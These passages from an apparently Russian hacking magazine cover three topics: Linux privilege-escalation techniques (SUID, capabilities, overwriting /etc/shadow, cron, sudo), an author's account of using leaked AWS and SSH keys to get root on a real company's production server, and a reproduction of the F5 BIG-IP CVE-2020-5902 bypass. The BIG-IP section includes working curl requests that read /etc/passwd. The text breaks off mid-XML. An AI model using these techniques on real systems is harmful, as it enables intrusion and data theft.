   Какие‐то вещи мы можем узнать вручную. Нап ример, получить сведения
о ядре:


uname ‐a 2>/dev/null

Или о процессоре:


cat /proc/cpuinfo 2>/dev/null

Или релиз ОС:


cat /etc/*‐release 2>/dev/nul

Можно, конечно, и даль ше собирать информа цию с помощью терминала,
но это долго. Гораздо проще и эффективнее использовать спе циальные тул‐
зы. Самые распространенные из них:
 • privilege‐escalation‐awesome‐scripts‐suite (linPEAS);
 • LinEnum;
 • PXEnum;
 • linuxprivchecker;
 • SysEnum;
 • linux‐smart‐enumeration.

Все они работают примерно по одному прин ципу: пос ледовательно запус‐
кают команды bash или короткие скрипты, а вывод отправляют в stdout
или лог‐файл в зависимос ти от параметров.
   Так примерно выглядит вывод подоб ной тул зы.





                              LinEnum


КУДА СМОТРЕТЬ?
Давай теперь разберем нес колько примеров уязвимос тей и пос мотрим,
как можно их эксплуатировать.


Всякое забытое
Первое, что сто ит проверить, — это забытые критичес кие данные. Ничего
не стоит заглянуть в домашние пап ки юзеров и посмотреть, не хранит ли
кто‐то на рабочем столе файл с паролем или клю чами от чего‐нибудь нуж‐
ного. Это случается ред ко, но все же случается. Иног да учетные данные хар‐
дкодят в скриптах и кон фигах. Стоит также про верить историю шелла, там
тоже могут найтись длинные команды, содержащие учетные данные. А иногда
бывает, что пользователь набрал пароль, когда консоль его не запрашивала,
и он тоже сохранится в истории.


SUID/GUID
Флаги setuid и setgid позволяют пользователю запускать программы от имени
владельца. Нап ример, когда надо запускать прог рамму от рута, а поль‐
зователь рутом не является. Чаще всего встречается SUID. Устанавливается
этот бит легко:


chmod +s /bin/script

Подразумевается, что программа с таким фла гом не сможет делать ничего,
кроме того, для чего она предназна чена. Но так как все мы люди и ошибаем‐
ся, то это хорошо порой ошибки поз воляют скомпрометировать сис тему.
Чаще всего к возможности повысить привилегии приводит воз можность
программы про изводить запись в фай ловую сис тему или каким‐то образом
выпол нять код.
  В первую оче редь нас интересуют файлы, владелец которых — root. Най ти
их можно руками, такой командой:


find / ‐user root ‐perm ‐u= s ‐type f 2>/dev/null

Как вариант — можно поискать в выводе тулз, которые я перечислил выше.
Так или иначе, если найдешь файлы с подоб ными разрешениями, значит,
у тебя есть шанс поднять ся до максимальных привилегий.
   Вот вывод таких файлов из LinEnum.sh.





Из интересных файлов — find. LinEnum даже услужливо его подсветил
отдельно.





Это позволит довольно легко получить привилегии.





Linux capabilities
Так как предыдущий способ дает избыточные пра ва файлам, в 1997 году
была придумана идея дополнительных раз решений — linux capabilities. Если
коротко, то идея состоит в том, чтобы давать не полные привиле гии, а только
часть, необходимую для выполнения задачи.
   Как это используется? Для начала найдем подобные файлы в системе.


getcap ‐r / 2>/dev/null

А вот результат.





Классический пример иллюстрации — это исполняемый файл  tar с раз‐
решением cap_dac_read_search+ep, которое поз воляет ему читать любой
файл в системе. Это озна чает, например, воз можность получить архив с фай‐
лом /etc/shadow, который от лица обычного пользователя недоступен
на чтение. Доступ к этому файлу даст нам хеши паролей, в том числе от root,
который мы можем попробовать сбру тить.
  Еще встре чается пус тое раз решение =ep. Когда выставлено такое раз‐
решение (есть знак «равно» в начале, и не перечис лен спи сок разрешений),
это значит, что файлу предос тавлены все воз можные разрешения. В примере
такие разрешения есть у файла openssl.
   Этот пример позволит нам про читать файл /etc/shadow.
   Сгенерим ключи.




Запустим веб‐сервер.




И прочитаем файл.





Далее мы можем просто сгенерить новый shadow и перезаписать им сис‐
темный. Создадим новый хеш, заменим им хеш (в примере — вос клицатель‐
ный знак) и подготовим файл для заливки.





Копируем его в /etc/shadow и логинимся.





Cron
Cron — это служба Unix, которая используется для периодического выпол‐
нения скриптов. Действия описываются в фай ле /etc/crontab и в специаль‐
ных каталогах (например, /etc/cron.daily).





Скрипты используются для самого широкого спектра задач — от создания
бэкапа по расписанию до очистки директории /tmp.
   Если у таких скриптов неаккурат но выставлены привилегии, то это может
стать находкой для ата кующего. Когда адми нистратор ставит привиле гии
как попало, «просто чтобы работало», он впол не может написать chmod 777,
что позволит нам отре дактировать вызываемый по расписанию скрипт. Пос‐
кольку cron запускает файлы от имени  root, ничто не мешает вызывать
рутовый шелл заодно со скриптом.


Sudo
Программа sudo позволяет выполнять команды от имени суперпользователя
(либо других пользователей системы). Ее конфиг находится в /etc/sudoers,
и, как правило, ошибки в этом конфиге открывают возможности эскалации
привилегий. Сценариев использования — множество, можно выбирать
по ситуации. Один из таких вариантов ниже.
  Проверяем, какие есть разрешения у sudo.





Здесь редактор vi можно открыть без пароля, и он запус тится от имени root.
В этом случае проще всего выполнить шелл через редактор, который тоже
запустится от рута.





Иногда админы дают раз решение на запуск обычных скриптов sh, и те оста‐
ются  доступными  для  записи.  Их,  конечно  же, можно  использовать
для получения шелла и любых других действий.


             INFO

                   Еще один способ абьюзить sudo — возможность
                       внед ряться в процесс с действующим токеном.



Эксплоиты для ядра
Как и в любой другой программе, в ядре Linux тоже есть уязвимости. Иногда
эти уязвимости позволяют подняться до рута. Как и в остальных способах,
здесь не существует универсального рецепта и успешная эксплу атация
зависит от многих факторов: версии ядра, наличия необходимых раз решений
или файлов  и  даже  наличия  нужного  железа  (например,  уязвимого
перед Meltdown процес сора).
  На скриншоте ниже — поиск экспло итов для ядра Linux в Kali.





При многообразии вариантов эксплуата ции не все они окажутся рабочими.
Может не быть экспло ита под конкретное ядро, либо версия ядра правиль‐
ная, но оно уже пропатчено. Некоторые экс плоиты работают нестабильно.
И так далее.
  Наверняка многие помнят уяз вимость в ядре, извес тную как Dirty COW.
Баг позволяет спровоцировать состояние гонки, а это приводит к тому, что
пользователь без привилегий получа ет доступ на запись к memory mappings
(хотя доступ должен быть только на чтение) и может повысить свои при виле‐
гии.
  Существует несколь ко экс пло итов для этой уяз вимос ти.





На конкретной системе будут работать не все из них, так что всегда есть
смысл перебирать разные варианты.
  Другие примеры уязвимостей для повышения привилегий:
 • CVE 2017‐16995;
 • CVE 2013‐1959;
 • CVE 2012‐0056;
 • CVE 2010‐3904.

Конечно, это не все уяз вимости. Их намного больше, и ты всегда можешь
поискать их описанным выше способом или покопаться на exploit‐db.com
и других ресурсах.


ЗАКЛЮЧЕНИЕ
Способов стать рутом в Linux — множес тво, и я здесь прошел ся только
по самым очевидным и рас пространенным. Тем, что встречаются и в реаль‐
ной жизни, и на CTF, и на экза менах.
  Вообще, зачастую это творческая задача: может не сработать ни один
из способов, но поможет какая‐то, порой неочевидная комбинация из раз‐
ных. Универсального рецепта здесь нет, и систему всегда нужно анализи‐
ровать всесторон не.
  На сайте GTFOBins есть отличная подборка способов использовать раз‐
ные популярные утилиты для повышения привилегий. Но помни: этот список
на самом деле значительно больше, просто нам еще пока не все известно!
  ВЗЛОМ




CHUM BUCKET

             КАК Я ВЗЛОМАЛ
  ДВАДЦАТИМИЛЛИАРДНУЮ КОРПОРАЦИЮ
   С ПОМОЩЬЮ БЕСПЛАТНОГО СЕРВИСА





  Новостные сообщения о регулярных утеч‐
   ках данных — дело привычное. Одна ко каж‐
  дому такому инциденту предшествует кро‐
  потливая работа: сбор и анализ информа‐
   ции, поиск брешей в защите и инструмен‐            d34db33f                                                                                              github.com/d34db33f‐1007
   тов для атаки. Сегодня я расскажу о том,                  t.me/ju_oj
   как  взломал  двадцатимиллиардную  кор‐
  порацию TUI Group при помощи общедос‐
   тупных бесплатных инструментов и природ‐
  ной смекалки.


   Reconnaissance, или сбор информации, — это первый этап тестирования
   на проникновение, ког да цель уже определена. Понемногу этот этап прев‐
   ратился в отдельную  науку, объединив в себе целый комплекс  тактик
   и методик, а также обзавелся мно жес твом инстру ментов и сервисов, упро‐
   щающих рутину. Какие воз можнос ти это нам открывает?
     1. Охота без конкретной цели или «нанимателя».
     2. Поиск новых масштаб ных угроз.
     3. Быстрая оцен ка распростра ненности конкрет ной угрозы.
     4. Нетсталкинг и просто исследование ради раз влечения.

   Дальше я перечислю самые популярные сервисы, с помощью которых можно
   провести полноценные исследования, и про демонстри рую основные приемы
   работы с ними. Однако главной темой статьи будет сервис grayhatwarfare.‐
   com, с помощью которого я и взломал корпорацию TUI Group.


  РЕСУРСЫ
   Сервисы для сбо ра информа ции можно условно разделить на несколько
   категорий — по типу предоставляемых данных или по сферам при менения.
   Перечислим наиболее извес тные из них.
    • Certiﬁcate Transparency — реестр привязанных к доменным именам циф‐
      ровых сертификатов, в том числе и самых свежих, включая субдомены.
    • Chaos, dnsdb.info,  intelx.io, securitytrails.com, Сertspotter, threatminer.org,
       crt.sh — базы данных доменных имен, сертификатов и всей остальной
     информации, связанной с домена ми.
    • OpenIntel — отсле жива ет сос тояние глобальной системы доменных имен.
    • Internet‐Wide Scan Data Repository — это публичный репози торий резуль‐
      татов сканирования интернет‐протоколов, сервисов и служб по всему
      интернету. Хостится командой ZMap. Помимо своих собс твенных датасе‐
       тов, команда аккумулирует и выкладыва ет данные и дру гих похожих про‐
       ектов. Этот ресурс — отличная воз можность поработать с сырыми и пол‐
     ными данными.
    • Rapid7 OpenData — то же самое, что и выше, только от создателей Metas‐
        ploit Framework.
    • Shodan, Zoomeye, Censys, fofa.so, riddler.io, spyse.com, thingful.net — поис‐
      ковики, которые исследуют почти всю тополо гию интернета, предоставляя
      возможность поиска по баннерам сервисов и протоколов, их хешам
      или содержанию HTML‐стра ниц. С их помощью можно найти подключен‐
     ные к сети устрой ства или работа ющие при ложения раз личных типов.
     В недавнем обновлении в Shodan появилась даже воз можность поиска
     по идентификационным номерам уязвимостей.
    • CommonCrawl —  репозиторий мно гофункционального  веб‐краулера,
     собирающего массу интересной информа ции.
    • GreyNoise, BinaryEdge, cybergreen.net, projecthoneypot.org — просто кла‐
      дезь знаний о текущих угрозах! Если ты не знаешь, что исследовать,
      или хочешь быть в курсе самых акту альных уязвимостей, тебе сюда. Трен‐
     ды и топ‐листы GreyNoise расскажут о техниках, которые, возможно,
     еще даже не были обнаружены специалистами ИБ, но активно эксплуати‐
      руются в реальном времени.
    • GrayHatWarfare — находит открытые для публичного доступа серверы Ama‐
      zon AWS. Использует при поиске сразу нес коль ко опенсорсных инстру‐
     ментов для сканирования, агрегируя все резуль таты. На данный момент
      GrayHatWarfare насканировал 279 тысяч доступных S3‐бакетов и 4,5 мил‐
      лиона файлов!

   Подобных ресурсов достаточно много, и некоторые я даже спе циально про‐
   пустил — например, psbdmp.ws — из‐за их черес чур узкой специализации.
   Однако сканировать весь интернет самостоятель но уж слишком дол го и тру‐
   доемко. На гитхабе можно найти большой арсенал инструментов, адап‐
   тированных для работы почти с каждым из упомяну тых сервисов. Но я пос‐
   тараюсь обратить твое внимание на упу щенные кей сы и пробудить порыв
    к новаторству!
     В конце статьи я кратко рас ска жу о моих экспериментах с, казалось бы,
   банальным Shodan. Ты, наверное, даже слышал об их пос ледстви ях, об этом
   писали и в «Хакере». Я свято верю, что не нарушил никаких законов, так что
   смело раскрою свое авторс тво и некоторые оставшиеся за кадром под‐
   робности.


   Кто чем занят
   Если вспомнить большинство громких утечек за последние год‐пол тора, то
   можно выделить современные тенденции и цели атакующих. Я их перечислю:
    • серверы MongoDB;
    • Rsync‐демоны;
    • Elasticsearch;
    • DigitalOcean;
    • Azure Blobs;
    • Google Storage.

   Очевидно, под угрозой в основном плохо настро енные серверы и приложе‐
   ния, в которых авторизация зачастую отсутству ет вовсе. Для сканирования
   используются все те же инстру менты с откры тым исходным кодом, которые
   можно найти на гитхабе, так что я не ста ну их перечислять. Некоторые ата‐
   кующие используют для поиска Shodan, дру гие сканируют сеть самостоятель‐
   но.
     Я не добавил AWS S3‐бакеты в список нес лучай но. Если посмотреть хро‐
   нологию утечек информа ции из бакетов, то можно заметить явное сни жение
   зафиксированных после 2018 года инцидентов. Это му поспособствовал ряд
   причин: шумиха, принятые Amazon меры, вооруженные сканерами баг‐хан‐
   теры и так далее.
     Конечно, можно купить хос тинг, обзавес тись новейшим соф том и принять
   участие в гонке сканеров, но мы не ищем лег ких путей! Подкрутить потоки
   и поковырять настрой ки какого‐нибудь при ложения может каждый, но самое
   интересное начинается там, где приходится исполь зовать смекалку.


  ОБДЕЛЕННЫЙ GRAYHAT
   Несмотря на обилие пуб ликаций на темати чес ких площадках, у довольно
   популярного и давно присутству ющего на рынке  GrayHatWarfare дол го
   не было ни одного приложения или биб лиотеки для пол ноценной работы
   с предоставляемым им API. Все, что я нашел на гитхабе, — это кри во
   написанный веб‐парсер на python‐mechanize.
     Оказалось, этому есть причины: использование услуг этого сервиса стоит
   немалых денег, а усло вия бесплатного акка унта не поз воляют рассчитывать
   на достойный результат. Хотя я могу ошибаться. Язык запросов API настолько
   прост и лаконичен, что писать код по большому счету не нужно. Тем не менее
   я решил создать инструмент для работы с GrayHatWarfare, а вместе с этим
   реализовать многопоточность и обой ти лимиты выдачи сервиса. Раз уж
   писать, то как следует!


  Обходим ограничения бесплатного тарифа
   Поиск по всем проиндексированным файлам огра ничен 2000 результатов.
  Файлы же в обособ ленном бакете мож но листать почти без ограничений,
   особенно когда мы ищем конкретные расширения файлов и используем
   исключающие ключевые сло ва. Так что я подменил один метод другим
   и реализовал перебор ID всех дос тупных бакетов. Таким образом, поиск всех
   имеющихся файлов с рас ширением .zip зай мет всего 20–30 минут. Ровно
   столько времени у меня ушло, чтобы скормить API 91 тысячу реквестов
   без единого фейла!


   Логика и инструкции поиска
   Итак, мы можем искать файлы с любыми расширениями. Между тем в API
   предусмотрена возможность добавлять к запросам ключевые слова, но толь‐
   ко исклю чающие, иначе поиск лома ется. Эти слова проверя ются в каждой
   отдельной части полного URL‐адреса искомого файла. Такой радикализм
   оправдан. В бакетах куча мусора типа меди афайлов, фронтенда и вся ких
   опенсорсных бэкенд‐модулей. Однако не бой ся экспериментировать: все
   отброшенные урлы все равно запишутся в отдель ный файлик trash.txt. Чтобы
   добавить свои собственные исключающие клю чевики, сохрани их в файл
    exclude.txt.
     Найденные файлы мож но фильтровать и по размеру. Он указывается
   во время запуска программы. Чтобы запустить приложе ние, выполни в тер‐
   минале сле дующие команды:


   ~$ git clone https://github.com/d34db33f‐1007/grayhat2.git
   ~$ cd grayhat2 && python3 main.py


  ДЕНЬГИ ЕСТЬ, УМА НЕ НАДО!
   Фильтрация файлов по раз меру — встроенная фича GrayHatWarfare API,
   но исключительно для оплаченных аккаунтов. В нашей реализации прог‐
   раммы мы можем получать раз меры фай лов нативным образом только
   потому, что по факту мы не выполняем поиск, а прос то лис таем содержимое
   бакетов одно за другим.
     Выходит, любой пользователь с оплаченным акка унтом может просто зап‐
   росить у API «топ‐1000» самых тяжелых файлов, которые нередко и оказыва‐
   ются набором поль зовательских данных, то есть прес ловутой «утечкой». Зна‐
    чит, искать там боль ше нечего? А вот и нет!


  Убиваем мейнстрим
  Я   попытался   искать   с  помощью   GrayHatWarfare  файлы   .csv
   тяжелее 500 Мбайт. Среди них попада лись интересные находки, но их ока‐
   залось недостаточно, чтобы ликовать и праз дновать победу.
      Второе, что мне пришло в голову, — это поиск приватных RSA/SSH‐клю‐
   чей. Вот тут мне повезло! Я проверил по очереди два расширения файлов:
   .priv и .key. К моему удивлению, уже через час после того, как я накатал
   на коленке свой питоновский  скрипт,  я обна ружил сразу  три  утечки!
   Как известно, беда не приходит одна. На серверах с при ватными ключами я
   также нашел следующее:
    • пользовательские данные фитнес‐приложения с миллионом установок
      в Play Market;
    • секретный токен аккаунта Amazon AWS от неко его uland.com.br;
    • и самое стоящее — секретный токен Amazon AWS и при ватный SSH‐ключ
      веб‐приложения Musement.com. Это итальянский стартап изначальной
      стоимостью в 60 миллионов долларов, теперь принад лежащий кор‐
     порации TUI Group.

   По первым двум инцидентам мне не удалось свя зать ся с владельцами ресур‐
   сов, но я уведомил Google и Amazon о произошедшем, хотя четкого ответа
   также не последовало. В TUI Group мне ответили на следующий день после
   обращения и залатали дыру уже спустя неделю.
     Дальше я поэтапно опишу, как получил полный доступ с правами супер‐
   пользователя к продакшен EC2‐инстансу Musement. Забавно, что такой оче‐
   видный инцидент до сих пор оста вался незамеченным. Это тревожный зво‐
   ночек: если тенденция стала мейнстримом, лучше всего ее избегать.


  ПЕРВЫЕ РЕЗУЛЬТАТЫ. ЧТО ДАЛЬШЕ?





                 Разработчики любезно оставили нам ключи

   Собрав access‐ключики, которые разработчики так любезно оставили в сво‐
   ем питоновском скрипте, я успешно авто ризовался в аккаунте Amazon. Поп‐
   робовав выполнить разные команды, я понял, что у меня имеется доступ толь‐
   ко на чтение, причем далеко не везде. К тому же сервер, к которому я хотел
   подклю читься по SSH, раз решал соединения только с IP‐адресов из белого
   списка.


  Собираем всю информацию об инфраструктуре
   Недол го думая, я нашел на гитхабе популярный awesome‐лист, посвященный
   пентесту Amazon, и начал с самого прос того. Первым делом я соб рал все
   публичные адреса EC2‐машин, а также все IP‐адреса из политик NACL (Net‐
   work Access Control List) с помощью утилиты aws_public_ips. В сумме наб‐
   ралось где‐то тридцать адресов.
     Собранные адреса я начал сканировать на наличие открытых портов
   в диапазоне 1–64 000 с помощью утилиты masscan. Пока шло сканирование,
   я запустил еще две классичес кие утилиты, которые позволяют получить более
   обширную и подробную информацию об имеющей ся в твоем распоряжении
   облачной инфраструктуре:
    • ScoutSuite2 — аудитор безопас ности AWS. Незаменимый инструмент,
      который заглянет в каж дый уголок обла ка и соз даст максимально удобный
      для изучения отчет;
    • pacu — то же самое, но заточен именно на поиск и эксплуатацию уяз‐
     вимостей в облаке, в том числе на повышение при виле гий, персистенцию,
      да и постэксплуатацию в целом.

   Результаты оказались неожиданно при ятными. Даже несмотря на то, что SGP
    (Security Group Policies) и IAM‐права для утекшего аккаунта были настроены
   корректно. Для начала pacu нашел спо соб повысить привилегии, пользовать‐
   ся которым мне не позволяют этичес кие прин ципы. Метод заключал ся в экс‐
   плуатации уязвимости CloudTrail CSV Injection. Имея возможность создавать
     trail (грубо говоря, события), я мог попытать ся создать trail с вредоносной Ex‐
   cel‐формулой в качестве наз вания. Эта попытка провалилась бы, но в логах
   осталось бы название. При импорте такого лога в формате .csv в Excel воз‐
   никает опасность выполнения вредонос ного кода на машине админис тра‐
   тора.
      ScoutSuite удивил меня еще больше. Ниже при ведены час тичные примеры
    того, что он смог нарыть в облаке.





              Учетные данные суперпользователей в Tomcat‐сервере



                   Некото рые лицензион ные ключики




                   Спо кой но брутим Basic HTTP auth ;)

   Кроме того, на самом S3‐бакете лежали очень интерес ные бэкенд‐файлики.
  В общей сумме я смог вытянуть из пользователь ских данных EC2‐машин
   где‐то 400 с лишним скриптов и конфигов.


  ОБХОДИМ ЗАЩИТУ AWS SGP





                  Результаты сканирования EC2‐машин

   Результаты сканирования внешних IP‐адресов EC2‐машин не сильно радова‐
    ли, пока я не обнаружил роутеры с дефолтны ми админ‐пароля ми и функцией
   VPN.



     93.62.224.145   ::   Huawei AR Web Platform
     93.62.224.151   ::   Huawei AR Web Platform


   Главное достоинство этих роутеров заключалось в том, что они находились
   в белом списке NACL для входящего и исхо дящего трафика по всем портам,
   вклю чая SSH, а также поз воляли маршру тизировать трафик сквозь себя.





               Роутеры поз воляли мар шрутизировать трафик

   Теперь я мог спокой но подключиться к главному продакшен‐серверу с root‐
   правами, используя найденный приват ный SSH‐ключ.





              Подклю чаемся к главному продакшен‐серверу


         WWW

                        Более подробные сведения о различиях между
                     SGP и NACL



  ЭТИЧНОСТЬ КАК ОНА ЕСТЬ
   Утечку компания пофиксила быс тро, но, к сожалению, ни воз награждения,
   ни даже банальной благодарности я от них не получил. Вместо этого мне
   сообщили, что на меня не ста нут подавать в суд, так как при тестировании я
   придерживался инструкций, которые они мне отправили на почту в ответ
   на мое письмо.
     Для меня этот опыт — неприятное напоминание о том, что часто IT‐ком‐
   пании ориентируются на гигантов индус трии, но игнорируют аспекты, связан‐
   ные с безопасностью сво его продукта и конечных пользователей. Поэтому
   давай сде лаем мир безопаснее общими усилиями!


  НЕ БАКЕТАМИ ЕДИНЫМИ!
   Уже качаешь оче редной hawkeye? Вот и правильно! Но не вздумай останав‐
   ливаться на серых шля пах: попробуй совместить Google‐дор ки с Shodan’ом
   или поиграть с его родными тегами в трендах. Из этой затеи вполне может
   получиться что‐нибудь интересное.
      «Хакер» в этом году писал об уязвимых видеорегистраторах LILIN. Эти уяз‐
   вимые регистраторы изначально нашел я, заинтересовался и начал ревер‐
    сить. Поэтому ответственно заявляю: в Qihoo 360 нагло приврали о количес‐
   тве уязвимых устрой ств. На самом деле их было не 5К, а более 300К. Вот ори‐
   гинальный дорк:


   http.html_hash:"1640961097"

  В итоге мне даже удалось продать найденные баги. Продавать я их пытал ся
   на легальных площадках вроде Zerodium, но не везде они котировались.
   Видимо, информация об уязвимос ти утекла в паб лик с одной из таких плат‐
   форм. В моем гитхабе ты можешь найти боль ше информации об этом инци‐
   денте.
     Еще «Хакер» как‐то писал об умных, но уяз вимых колонках Sonos. Да, и тут
   без меня не обошлось. ;) Потенциал открытых данных безграничен! Особен‐
   но — если проявлять смекалку при использовании общедоступных инстру‐
   ментов OSINT.
ВЗЛОМ
БОЛЬШАЯ
ДЫРА
  BIG-IPВ





КАК РАБОТАЕТ
НОВАЯ УЯЗВИМОСТЬ

                                                                                           aLLyВ ПРОДУКТАХ КОМПАНИИ F5                                                                                      ONsec
                                                                                                    @iamsecurity





В июле 2020 года немало шума на делала уязвимость, най‐
денная в линейке про дуктов F5, в частности — в BIG‐IP.
Это контроллер доставки приложений, который используют
и в крупнейших компаниях вроде бан ков и операторов
сотовой связи. Уязвимости присвоили наивысший уровень
опасности, поскольку она позволяет без каких‐либо при‐
вилегий получить полный контроль над целью.


В составе BIG‐IP есть разные модули, которые работают под управле нием
операционной системы TMOS. Один из них — Local Traﬃc Manager (LTM) —
обрабатывает трафик приложений, обеспечива ет безопасность сетевой
инфраструктуры и локальную балансировку нагрузки. LTM можно гиб ко нас‐
траивать, в том числе при помощи веб‐интерфей са TMUI (Traﬃc Management
User Interface). В нем и нашли уязвимость.
   Точнее, нашел Михаил Ключников из Positive Technologies. Баг существует
из‐за некорректной нормализации URI при обработке запросов. Злоумыш‐
ленник может обой ти аутентификацию в Traﬃc Management User Interface
и использовать функции системы, которые предназначены только для адми‐
нистратора. В результате этого ата кующий может выполнять произвольные
команды на целевой системе от суперпользователя, а это означает пол ную
компрометацию сервера.


             INFO

                       Баг     получил     номер     CVE‐2020‐5902
                      и 10 из 10 баллов критичности по CVSS. Уяз‐
                       вимость   присутствует   в   BIG‐IP   версий
                        с 15.0.0 по 15.1.0.3, с 14.1.0 по 14.1.2.5, 13.1.0–
                            13.1.3.3, 12.1.0–12.1.5.1 и 11.6.1–11.6.5.1.



ТЕСТОВЫЙ СТЕНД
Так  как продукт коммерчес кий, простого докер‐контейнера в этот раз
не будет. Самый легкий способ поднять стенд — это скачать тридцатид‐
невную пробную версию BIG‐IP VE (Virtual Edition). Для этого нужен аккаунт,
который можно создать на сайте F5. Пос ле подтверждения можно будет
переходить в раздел загрузок.
  Нам нужна последняя уязвимая вер сия, это — 15.1.0.3. BIG‐IP распростра‐
няется в нескольких вариантах, нас интересует об раз виртуальной машины
в формате OVA. Перед загрузкой предложат выб рать удобное зеркало.





      Страница загрузки виртуальной машины BIG‐IP в формате OVA

Также можешь попробовать вос пользоваться моей ссылкой для скачивания
образа. Не могу сказать, сколько она проживет, но пока отлично работает.
  После этого импортируем скачанный образ в свою программу виртуали‐
зации. Я буду использовать VMware, но и VirtualBox отлично с этим справится.
  После успешного импорта загружа ем вир туалку. Через некоторое время
видим приглашение для авториза ции.





               Авториза ция в виртуальной машине BIG‐IP

По дефолту пароль для суперпользователя — default (тебе сразу предложат
его сменить). Теперь можно посмотреть IP‐адрес виртуал ки.





                   IP‐адрес вир туальной машины BIG‐IP

Открываем браузер и перехо дим на этот IP. Видим форму авторизации Traﬃc
Management User Interface.





           Форма авторизации BIG‐IP Conﬁguration Utility

Стенд готов.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

     БОЛЬШАЯ ДЫРА
                BIG-IP           В
                  КАК РАБОТАЕТ НОВАЯ УЯЗВИМОСТЬ
                     В ПРОДУКТАХ КОМПАНИИ F5





ДЕТАЛИ УЯЗВИМОСТИ
Вернемся в консоль. Пос мотрим, что за веб‐сервер слушает 443‐й порт.


netstat ‐lnpe | grep 443





          Смотрим, какой сервис слушает 443‐й порт в BIG‐IP

Это обычный демон httpd, но очевидно, что он используется прос то
как фронтенд для проксирования зап росов куда‐то дальше. Поищем среди
конфигурационных фай лов директивы ProxyPass.


grep ‐iR ProxyPass /etc/httpd





          Поиск директивы проксирова ния в конфигах httpd

Нашлось много интересного в файле /etc/httpd/conf.d/proxy_ajp.conf.


/etc/httpd/conf.d/proxy_ajp.conf
...
ProxyPassMatch ^/tmui/(.*\.jsp .*)$ ajp ://localhost:8009 /tmui /$1 retry
=5
ProxyPassMatch ^/tmui /Control/(.*)$ ajp ://localhost:8009 /tmui /Control
/$1 retry =5
ProxyPassMatch ^/tmui /deal/?(.*)$ ajp ://localhost:8009 /tmui /deal /$1
retry =5
ProxyPassMatch ^/tmui /graph/(.*)$ ajp ://localhost:8009 /tmui /graph /$1
retry =5
ProxyPassMatch ^/tmui /service/(.*)$ ajp ://localhost:8009 /tmui /service
/$1 retry =5
ProxyPassMatch ^/hsqldb(.*)$ ajp ://localhost:8009 /tmui /hsqldb $1 retry
=5
...

И название, и содержимое файла наводят на мысль, что запросы переп‐
равляются к веб‐серверу Tomcat по про токолу AJP. О нем я уже писал
в статье про уязвимость в Tomcat.





         8009‐й порт — это AJP‐протокол сервера Apache Tomcat

Но сейчас проблема не в этом. Нам нуж но пос мотреть на то, как передается
URI к Tomcat. Здесь стоит обра титься к большому иссле дованию Оранжа Цая
о нормализации путей в различных приложениях, которое он представил
на Black Hat USA 2018 и DEF CON 26 (PDF). Там есть раздел о Tomcat, где
конструкция /..;/ исполь зуется для выхода из директории, обхода некото‐
рых правил и получения дос тупа к файлам с важной информацией. Это воз‐
можно потому, что веб‐сервер воспринимает конс трукцию /..;/ как имя пап‐
ки, а Tomcat интерпретирует его в качес тве отно сительного пути — вверх
по дереву в родительскую директорию.
   Чтобы проверить, работает ли этот баг в нашем слу чае, попробуем про‐
читать какой‐нибудь файл, доступ к которому в обычных условиях запрещен.
Список таких можно пос мотреть, например, в конфиге TMUI — /usr/local/
www/tmui/WEB‐INF/web.xml.


/usr/local/www/tmui/WEB-INF/web.xml
<servlet‐mapping>
    <servlet‐name>org.apache.jsp.dashboard.viewset_jsp</servlet‐name>
    <url‐pattern>/dashboard/viewset.jsp</url‐pattern>
</servlet‐mapping>

Попробуем его просмотреть прос тым запросом.


curl ‐k "https://192.168.31.140/tmui/dashboard/viewset.jsp" ‐is

В ответ получаем редирект на страницу авторизации. А теперь сделаем
это при помощи конструкции /..;/.


curl ‐k "https://192.168.31.140/tmui/login.jsp/..;/dashboard/viewset.
jsp" ‐is

Скрипт viewset.jsp отрабатывает успешно, и сервер воз вращает результат.





    Обход авторизации и просмотр недоступных страниц в F5 BIG‐IP

Теперь мы можем читать любые стра ницы и выполнять сервлеты, которые
не проверяют сессию пользователя внутри себя.
  Давай посмотрим, что можно откопать в дебрях TMUI. Все самое интерес‐
ное лежит в директории /usr/local/www/tmui/WEB‐INF/. Здесь же находят‐
ся и сами сервлеты, в откомпилированном виде. В связи с этим мне понадо‐
бится JD‐GUI. Чтобы было про ще, советую просто заархивировать дирек‐
торию /usr/local/www/tmui/WEB‐INF/ в формате ZIP и открыть в JD‐GUI.





              Декомпиляция клас сов BIG‐IP в JD‐GUI

А список эндпойнтов, как мы уже выяснили, можно найти в файле /usr/lo‐
cal/www/tmui/WEB‐INF/web.xml. Их очень мно го, поэтому приведу здесь
несколько наибо лее интерес ных, которые были найдены пос ле релиза уяз‐
вимости в паблик.
  Первый — /tmui/locallb/workspace/fileRead.jsp.


/usr/local/www/tmui/WEB-INF/web.xml
...
<servlet>
    <servlet‐name>org.apache.jsp.tmui.locallb.workspace.fileRead_jsp
</servlet‐name>
    <servlet‐class>org.apache.jsp.tmui.locallb.workspace.fileRead_jsp
</servlet‐class>
</servlet>
...
<servlet‐mapping>
    <servlet‐name>org.apache.jsp.tmui.locallb.workspace.fileRead_jsp
</servlet‐name>
    <url‐pattern>/tmui/locallb/workspace/fileRead.jsp</url‐pattern>
</servlet‐mapping>
...


WEB-
INF/classes/org/apache/jsp/tmui/locallb/workspace/fileRead_jsp.java
01: package WEB‐INF.classes.org.apache.jsp.tmui.locallb.workspace;
...
26: public final class fileRead_jsp extends HttpJspBase implements
JspSourceDependent {
...
61:   public void _jspService(HttpServletRequest request,
HttpServletResponse response) throws IOException, ServletException {
...
77:       String fileName = WebUtils.getProperty(request, "fileName")
;
78:       try {
79:         JSONObject resultObject = WorkspaceUtils.readFile(
fileName);
80:         out.print(resultObject.toString());

Этот  сервлет  позволя ет  читать  про извольные файлы,  если  передать
в параметре fileName. Про буем прочитать каноничный /etc/passwd.


curl ‐k "https://192.168.31.140/tmui/login.jsp/..;/tmui/locallb/
workspace/fileRead.jsp?fileName=/etc/passwd" ‐is

Успех, сервер возвращает содержимое фай ла.





                 Чтение произвольных файлов в BIG‐IP

Из интересных файлов, которые можно про читать, стоит отметить:
 • /etc/hosts — здесь можно узнать IP‐адреса инфраструктуры BIG‐IP;
 • /config/bigip.conf — здесь находятся переменные конфигурации
   BIG‐IP;
 • /config/bigip.license —  тут  можно  почерпнуть  информацию
  о текущей лицензии BIG‐IP.

Список можно продол жать — я уверен, ты зна ешь еще пару десятков заман‐
чивых файлов, которые только и ждут того, чтобы их прочитали. А чтобы было
еще проще, на помощь нам приходит следующий интерес ный сервлет —
/tmui/locallb/workspace/directoryList.jsp.


/usr/local/www/tmui/WEB-INF/web.xml
...
<servlet>
    <servlet‐name>org.apache.jsp.tmui.locallb.workspace.
